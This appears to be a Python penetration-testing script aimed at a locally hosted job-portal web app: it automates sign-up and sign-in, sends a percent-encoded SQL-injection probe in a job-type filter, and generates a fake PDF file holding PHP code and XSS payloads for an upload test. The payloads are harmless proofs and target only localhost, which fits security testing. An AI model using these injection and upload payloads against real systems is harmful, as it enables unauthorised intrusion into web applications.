import requests

ACCOUNT = {
    "name": "asd",
    "email": "asd@asd.com",
    "password": "asd",
}

HOST = "http://localhost:8080/"

PHPSESSID = ""

headers = {
    "Cookie": f"PHPSESSID={PHPSESSID}"
}

def encoded_custom(input_text: str):
    ans = ""
    for c in input_text:
        ans += "%" + hex(ord(c))[2:]
    
    return ans

def do_signup(option: int):
    global PHPSESSID, headers
    url = "auth/sign-up/job-seeker"
    
    body = {
        "name": "asd",
        "email": "asd@asd.com",
        "password": "asd",
    }
    
    res = requests.post(HOST + url, data=body)
    print(res.status_code, res.text)

def do_signin():
    global PHPSESSID, headers
    url = "auth/sign-in"
    payload = {
        "email": ACCOUNT['email'],
        "password": ACCOUNT['password']
    }
    
    # get the id first
    res = requests.get(HOST + url)
    PHPSESSID = res.cookies.get('PHPSESSID')
    headers["Cookie"] = "PHPSESSID=" + PHPSESSID
    
    # sign in (same session id)
    res = requests.post(HOST + url, data=payload)
    # print(res.text)

def do_jobsearch():
    global PHPSESSID, headers
    url = "jobs"
    payload = encoded_custom("-- '")
    print(payload)

    params = {
      "search": "",
      "sort-created-at": "newest-first",
      "created-at-from": "",
      "created-at-to=": "",
      'job-types[]': ['full-time ' + payload, 'part-time', 'internship']
    } 

    res = requests.get(HOST + url, headers=headers, params=params)
    # print(res.text)
    

def generate_file():
    png_signature = bytes.fromhex("89 50 4E 47 0D 0A 1A 0A")
    
    pdf_signature = b"%PDF-1.7\n"
    
    php_code = '<html><?php echo "iniedbertawikwok"; ?>\n<img src=x onerror=alert(1));>\n<script>alert(1)</script></html>'
    
    output_filename = "payload_test.pdf"
    
    # Convert PHP code to bytes
    php_payload = php_code.encode("utf-8")
    
    # Combine the PDF signature and PHP payload
    file_content = php_payload
    
    # Write the content to the output file
    with open(output_filename, "wb") as f:
        f.write(file_content)
    
    print(f"Generated file: {output_filename}")
    
if __name__ == "__main__":
    # done sign in
    # do_signin()
    
    # try to upload file
    # print(PHPSESSID)
    # do_jobsearch()
    generate_file()